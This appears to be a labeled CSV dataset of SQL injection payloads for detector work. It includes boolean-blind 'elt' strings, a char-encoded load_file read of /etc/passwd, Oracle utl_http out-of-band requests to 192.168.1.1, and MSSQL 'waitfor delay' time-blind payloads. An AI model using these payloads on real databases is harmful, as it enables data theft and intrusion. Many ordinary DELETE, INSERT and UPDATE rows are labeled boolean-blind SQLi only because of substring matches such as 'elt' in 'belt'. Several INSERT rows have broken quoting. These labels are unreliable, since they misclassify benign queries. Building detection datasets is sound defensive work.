id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree,payload_norm,wrapper_detected,strip_depth,payload_delex_v2,signature,tier
23675,"1 where 9072 = 9072 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1 where 9072 = 9072 and elt ( 4249 = 4249,7259 ) --",False,0,"__INT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",c9187638,gold
24254,"1 where 6965 = 6965 and elt ( 3933 = 1232,1232 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1 where 6965 = 6965 and elt ( 3933 = 1232,1232 ) --",False,0,"__INT__ where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",c9187638,gold
8850,DELETE FROM if,boolean_blind,mysql,0.9,Signals: 'if'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,DELETE FROM if,False,0,delete from if,d62eb7fb,gold
2806,DELETE FROM express WHERE adult = 'spin',boolean_blind,mysql,0.9,Signals: 'exp'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,DELETE FROM express WHERE adult = 'spin',False,0,delete from __IDENT__ where __IDENT__ = __STR__,dba3286b,gold
3273,DELETE FROM belt WHERE also = 'information',boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,DELETE FROM belt WHERE also = 'information',False,0,delete from __IDENT__ where __IDENT__ = __STR__,dba3286b,gold
5410,DELETE FROM frighten WHERE ordinary = 'fine',boolean_blind,mysql,0.9,Signals: 'ord'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,DELETE FROM frighten WHERE ordinary = 'fine',False,0,delete from __IDENT__ where __IDENT__ = __STR__,dba3286b,gold
5968,DELETE FROM river WHERE furniture = 'record',boolean_blind,mysql,0.9,Signals: 'ord'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,DELETE FROM river WHERE furniture = 'record',False,0,delete from __IDENT__ where __IDENT__ = __STR__,dba3286b,gold
4287,"INSERT INTO prove ( hand, remain, teacher, chance, getting, experience ) VALUES ( 'regular', 'extra'. obtain', 'beyond', 'mirror', 'zoo', 'search' )",boolean_blind,mysql,0.9,Signals: 'exp'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO prove ( hand, remain, teacher, chance, getting, experience ) VALUES ( 'regular', 'extra'. obtain', 'beyond', 'mirror', 'zoo', 'search' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
3733,"INSERT INTO piano ( later, separate, teach, appropriate, idea, dish ) VALUES ( 'experience', 'use'. return', 'doctor', 'audience', 'examine', 'opinion' )",boolean_blind,mysql,0.9,Signals: 'exp'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO piano ( later, separate, teach, appropriate, idea, dish ) VALUES ( 'experience', 'use'. return', 'doctor', 'audience', 'examine', 'opinion' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
9398,"INSERT INTO prize ( low, opinion, action, division, though, taken ) VALUES ( 'order', 'spider'. dust', 'fort', 'view', 'factor', 'bigger' )",boolean_blind,mysql,0.9,Signals: 'ord'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO prize ( low, opinion, action, division, though, taken ) VALUES ( 'order', 'spider'. dust', 'fort', 'view', 'factor', 'bigger' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
3452,"INSERT INTO fact ( difficult, wherever, movie, page, twice, mistake ) VALUES ( 'collect', 'park'. room', 'army', 'grow', 'shall', 'board' )",boolean_blind,mysql,0.9,Signals: 'if'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO fact ( difficult, wherever, movie, page, twice, mistake ) VALUES ( 'collect', 'park'. room', 'army', 'grow', 'shall', 'board' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
11108,"INSERT INTO large ( paid, ride, clothes, success, minute, porch ) VALUES ( 'word', 'had'. nose', 'cold', 'way', 'pencil', 'coat' )",boolean_blind,mysql,0.9,Signals: 'ord'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO large ( paid, ride, clothes, success, minute, porch ) VALUES ( 'word', 'had'. nose', 'cold', 'way', 'pencil', 'coat' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
11016,"INSERT INTO usually ( living, everything, story, opinion, tape, scientific ) VALUES ( 'chain', 'journey'. deer', 'frozen', 'shallow', 'shake', 'age' )",boolean_blind,mysql,0.9,Signals: 'if'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO usually ( living, everything, story, opinion, tape, scientific ) VALUES ( 'chain', 'journey'. deer', 'frozen', 'shallow', 'shake', 'age' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
4194,"INSERT INTO gradually ( teeth, surprise, different, visitor, know, habit ) VALUES ( 'lot', 'floor'. pig', 'cry', 'follow', 'twenty', 'sick' )",boolean_blind,mysql,1.0,"Signals: 'if', 'dual'; Boolean-blind SQLi (OR/AND logic); DB: mysql",2,"INSERT INTO gradually ( teeth, surprise, different, visitor, know, habit ) VALUES ( 'lot', 'floor'. pig', 'cry', 'follow', 'twenty', 'sick' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
34573,"INSERT INTO command ( trap, equal, classroom, solution, mirror, know ) VALUES ( 'border', 'wave'. share', 'tropical', 'soap', 'first', 'country' )",boolean_blind,mysql,0.9,Signals: 'ord'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO command ( trap, equal, classroom, solution, mirror, know ) VALUES ( 'border', 'wave'. share', 'tropical', 'soap', 'first', 'country' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
10655,"INSERT INTO poetry ( fall, practice, every, element, next, shown ) VALUES ( 'example', 'room'. friend', 'aboard', 'expression', 'hat', 'engine' )",boolean_blind,mysql,0.9,Signals: 'exp'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO poetry ( fall, practice, every, element, next, shown ) VALUES ( 'example', 'room'. friend', 'aboard', 'expression', 'hat', 'engine' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
10320,"INSERT INTO saw ( knowledge, at, manufacturing, stream, me, melted ) VALUES ( 'century', 'salmon'. old', 'move', 'line', 'open', 'wood' )",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO saw ( knowledge, at, manufacturing, stream, me, melted ) VALUES ( 'century', 'salmon'. old', 'move', 'line', 'open', 'wood' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
4471,"INSERT INTO wrong ( taste, upward, daughter, develop, word, very ) VALUES ( 'face', 'aid'. dance', 'zero', 'sit', 'worth', 'could' )",boolean_blind,mysql,0.9,Signals: 'ord'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO wrong ( taste, upward, daughter, develop, word, very ) VALUES ( 'face', 'aid'. dance', 'zero', 'sit', 'worth', 'could' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
7167,"INSERT INTO apple ( difference, bat, jungle, including, circle, today ) VALUES ( 'title', 'repeat'. end', 'let', 'floating', 'explore', 'tax' )",boolean_blind,mysql,1.0,"Signals: 'if', 'exp'; Boolean-blind SQLi (OR/AND logic); DB: mysql",2,"INSERT INTO apple ( difference, bat, jungle, including, circle, today ) VALUES ( 'title', 'repeat'. end', 'let', 'floating', 'explore', 'tax' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
4657,"INSERT INTO desk ( hidden, atomic, lift, subject, noon, second ) VALUES ( 'fed', 'badly'. sure', 'word', 'alive', 'first', 'yesterday' )",boolean_blind,mysql,1.0,"Signals: 'if', 'ord'; Boolean-blind SQLi (OR/AND logic); DB: mysql",2,"INSERT INTO desk ( hidden, atomic, lift, subject, noon, second ) VALUES ( 'fed', 'badly'. sure', 'word', 'alive', 'first', 'yesterday' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
6425,"INSERT INTO bus ( worry, voice, melted, express, shore, individual ) VALUES ( 'thick', 'cave'. quick', 'sense', 'broad', 'lucky', 'hunter' )",boolean_blind,mysql,1.0,"Signals: 'elt', 'exp', 'dual'; Boolean-blind SQLi (OR/AND logic); DB: mysql",2,"INSERT INTO bus ( worry, voice, melted, express, shore, individual ) VALUES ( 'thick', 'cave'. quick', 'sense', 'broad', 'lucky', 'hunter' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
7539,"INSERT INTO pick ( tip, could, specific, far, explore, seat ) VALUES ( 'complete', 'nine'. therefore', 'careful', 'consonant', 'grown', 'become' )",boolean_blind,mysql,1.0,"Signals: 'if', 'exp'; Boolean-blind SQLi (OR/AND logic); DB: mysql",2,"INSERT INTO pick ( tip, could, specific, far, explore, seat ) VALUES ( 'complete', 'nine'. therefore', 'careful', 'consonant', 'grown', 'become' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
4844,"INSERT INTO amount ( border, slide, north, egg, draw, stock ) VALUES ( 'atomic', 'heart'. language', 'baseball', 'weak', 'harbor', 'support' )",boolean_blind,mysql,0.9,Signals: 'ord'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO amount ( border, slide, north, egg, draw, stock ) VALUES ( 'atomic', 'heart'. language', 'baseball', 'weak', 'harbor', 'support' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
34968,"INSERT INTO statement ( at, search, recall, fun, arrive, rapidly ) VALUES ( 'her', 'task'. point', 'pure', 'terrible', 'verb', 'wife' )",boolean_blind,mysql,0.9,Signals: 'if'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO statement ( at, search, recall, fun, arrive, rapidly ) VALUES ( 'her', 'task'. point', 'pure', 'terrible', 'verb', 'wife' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
2601,"1"" ) where 3445 = 3445 and elt ( 1212 = 1254,1254 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1"" ) where 3445 = 3445 and elt ( 1212 = 1254,1254 ) --",False,0,"__INT__"" ) where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",de318863,gold
23633,"1"" ) where 8571 = 8571 and elt ( 4249 = 4249,7259 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"1"" ) where 8571 = 8571 and elt ( 4249 = 4249,7259 ) --",False,0,"__INT__"" ) where __INT__ = __INT__ and elt ( __INT__ = __INT__ , __INT__ ) --",de318863,gold
10473,"INSERT INTO vote ( frame, more, from, date, simple, children ) VALUES ( 'stand', 'love'. upon', 'mill', 'if', 'system', 'deep' )",boolean_blind,mysql,0.9,Signals: 'if'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"INSERT INTO vote ( frame, more, from, date, simple, children ) VALUES ( 'stand', 'love'. upon', 'mill', 'if', 'system', 'deep' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , from , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dfeded0a,gold
34181,"UPDATE explore SET section = 'lot', City = 'forgot' WHERE equator = eaten",boolean_blind,mysql,0.9,Signals: 'exp'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"UPDATE explore SET section = 'lot', City = 'forgot' WHERE equator = eaten",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,gold
7355,"UPDATE sale SET jar = 'shorter', City = 'chain' WHERE occur = ordinary",boolean_blind,mysql,0.9,Signals: 'ord'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"UPDATE sale SET jar = 'shorter', City = 'chain' WHERE occur = ordinary",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,gold
35750,"UPDATE location SET couple = 'line', City = 'key' WHERE belt = village",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"UPDATE location SET couple = 'line', City = 'key' WHERE belt = village",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,gold
6336,"UPDATE alike SET think = 'gather', City = 'oil' WHERE expect = sit",boolean_blind,mysql,0.9,Signals: 'exp'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"UPDATE alike SET think = 'gather', City = 'oil' WHERE expect = sit",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,gold
5965,"UPDATE which SET tower = 'gone', City = 'record' WHERE gate = hospital",boolean_blind,mysql,0.9,Signals: 'ord'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"UPDATE which SET tower = 'gone', City = 'record' WHERE gate = hospital",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,gold
35773,"UPDATE to SET born = 'lion', City = 'belt' WHERE range = rising",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"UPDATE to SET born = 'lion', City = 'belt' WHERE range = rising",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,gold
9681,"UPDATE whole SET life = 'man', City = 'key' WHERE recall = valuable",boolean_blind,mysql,0.9,Signals: 'if'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"UPDATE whole SET life = 'man', City = 'key' WHERE recall = valuable",False,0,"update __IDENT__ set __IDENT__ = __STR__ , __IDENT__ = __STR__ where __IDENT__ = __IDENT__",e78442cc,gold
1034,"-7084 ) where 2260 = 2260 or elt ( 1032 = 1032,3623 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-7084 ) where 2260 = 2260 or elt ( 1032 = 1032,3623 ) --",False,0,"-__INT__ ) where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",f3aea1e3,gold
1525,"-9725 ) where 9068 = 9068 or elt ( 4723 = 1426,1426 ) --",boolean_blind,mysql,0.9,Signals: 'elt'; Boolean-blind SQLi (OR/AND logic); DB: mysql,2,"-9725 ) where 9068 = 9068 or elt ( 4723 = 1426,1426 ) --",False,0,"-__INT__ ) where __INT__ = __INT__ or elt ( __INT__ = __INT__ , __INT__ ) --",f3aea1e3,gold
6426,"INSERT INTO respect ( say, officer, on ) VALUES ( 'ruler', 'party', 'gradually' )",boolean_blind,oracle,0.9,Signals: 'dual'; Boolean-blind SQLi (OR/AND logic); DB: oracle,2,"INSERT INTO respect ( say, officer, on ) VALUES ( 'ruler', 'party', 'gradually' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , on ) values ( __STR__ , __STR__ , __STR__ )",484d111e,gold
9774,UPDATE writer SET draw = 'simple'WHERE eat = 'gradually',boolean_blind,oracle,0.9,Signals: 'dual'; Boolean-blind SQLi (OR/AND logic); DB: oracle,2,UPDATE writer SET draw = 'simple'WHERE eat = 'gradually',False,0,update __IDENT__ set __IDENT__ = __IDENT__ __IDENT__ = __STR__,c3d062a2,gold
9584,"INSERT INTO herd ( softly, rising, storm, claws, bowl, merely ) VALUES ( 'lunch', 'writer'. individual', 'anyone', 'recent', 'say', 'clean' )",boolean_blind,oracle,0.9,Signals: 'dual'; Boolean-blind SQLi (OR/AND logic); DB: oracle,2,"INSERT INTO herd ( softly, rising, storm, claws, bowl, merely ) VALUES ( 'lunch', 'writer'. individual', 'anyone', 'recent', 'say', 'clean' )",False,0,"insert into __IDENT__ ( __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ , __IDENT__ ) values ( __STR__ , __STR__. __IDENT__' )",dd461dd0,gold
38,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...",out_of_band,mysql,1.0,"Signals: 'load_file', 'char'; DB: mysql. Payload length: 56 chars.",2,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115, ...",False,0,"__INT__ ; ( load_file ( char ( __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , ...",03e5686e,gold
6,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100 ) ) ) ,1,1,1;",out_of_band,mysql,1.0,"Signals: 'load_file', 'char'; DB: mysql. Payload length: 77 chars.",2,"1; ( load_file ( char ( 47,101,116,99,47,112,97,115,115,119,100 ) ) ) ,1,1,1;",False,0,"__INT__ ; ( load_file ( char ( __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ , __INT__ ) ) ) , __INT__ , __INT__ , __INT__ ;",308a6eef,gold
40420,'||utl_http.request('httP://192.168.1.1/')||',out_of_band,oracle,0.9,Signals: 'utl_http'; DB: oracle. Payload length: 45 chars.,2,'||utl_http.request('httP://192.168.1.1/')||',False,0,|| utl_http . __IDENT__ ( __IDENT__: / / __IDENT__ / __STR__,ed6a063f,gold
203,||utl_http.request ( 'httP://192.168.1.1/' ) ||',out_of_band,oracle,0.9,Signals: 'utl_http'; DB: oracle. Payload length: 48 chars.,2,||utl_http.request ( 'httP://192.168.1.1/' ) ||',False,0,|| utl_http . __IDENT__ ( __STR__ ) || ',f0fb70cf,gold
1611,waitfor delay '0:0:5'-- thuo,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,waitfor delay '0:0:5'-- thuo,False,0,waitfor __IDENT__ __STR__ -- __IDENT__,04e80b6e,gold
19706,1%' ) ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,1%' ) ) ) waitfor delay '0:0:5'--,False,0,__INT__ % ) ) ) waitfor __IDENT__ __TIME__ --,0c5f404b,gold
1061,1' waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,1' waitfor delay '0:0:5'--,False,0,__INT__ waitfor __IDENT__ __TIME__ --,0d1e600b,gold
25868,waitfor delay '0:0:5',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,waitfor delay '0:0:5',False,0,waitfor __IDENT__ __STR__,11e223e4,gold
897,waitfor delay '0:0:5' and ( ( 'nvqf' = 'nvqf,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,waitfor delay '0:0:5' and ( ( 'nvqf' = 'nvqf,False,0,waitfor __IDENT__ __STR__ and ( ( __STR__ = '__IDENT__,137bcfc4,gold
24829,waitfor delay '0:0:5' and ( ( 'uvlf' = 'uvlf,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,waitfor delay '0:0:5' and ( ( 'uvlf' = 'uvlf,False,0,waitfor __IDENT__ __STR__ and ( ( __STR__ = '__IDENT__,137bcfc4,gold
22338,"waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,"waitfor delay '0:0:5' and ""cvqn"" like ""cvqn",False,0,"waitfor __IDENT__ __STR__ and __STR__ like ""__IDENT__",175da789,gold
23549,"1"" ) as ghpx where 2873 = 2873 waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,"1"" ) as ghpx where 2873 = 2873 waitfor delay '0:0:5'--",False,0,"__INT__"" ) as __IDENT__ where __INT__ = __INT__ waitfor __IDENT__ __STR__ --",190b14bc,gold
24234,"1"" ) as ymsc where 3694 = 3694 waitfor delay '0:0:5'--",time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,"1"" ) as ymsc where 3694 = 3694 waitfor delay '0:0:5'--",False,0,"__INT__"" ) as __IDENT__ where __INT__ = __INT__ waitfor __IDENT__ __STR__ --",190b14bc,gold
933,waitfor delay '0:0:5' and 'dfzn' = 'dfzn,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,waitfor delay '0:0:5' and 'dfzn' = 'dfzn,False,0,waitfor __IDENT__ __STR__ and __STR__ = '__IDENT__,21657871,gold
23082,waitfor delay '0:0:5' and 'gsvt' = 'gsvt,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,waitfor delay '0:0:5' and 'gsvt' = 'gsvt,False,0,waitfor __IDENT__ __STR__ and __STR__ = '__IDENT__,21657871,gold
23015,1 waitfor delay '0:0:5',time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,1 waitfor delay '0:0:5',False,0,__INT__ waitfor __IDENT__ __STR__,220b30da,gold
19748,"waitfor delay '0:0:5' and ( ""%"" = """,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,"waitfor delay '0:0:5' and ( ""%"" = """,False,0,"waitfor __IDENT__ __STR__ and ( __STR__ = """,23edede6,gold
654,1 ) ) ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,1 ) ) ) waitfor delay '0:0:5'--,False,0,__INT__ ) ) ) waitfor __IDENT__ __STR__ --,253a2a90,gold
21047,1' in boolean mode ) waitfor delay '0:0:5'--,time_blind,mssql,0.9,Signals: 'waitfor'; Time-blind SQLi (sleep/delay function); DB: mssql,2,1' in boolean mode ) waitfor delay '0:0:5'--,False,0,__INT__ in __IDENT__ __IDENT__ ) waitfor __IDENT__ __TIME__ --,2620d0cf,gold
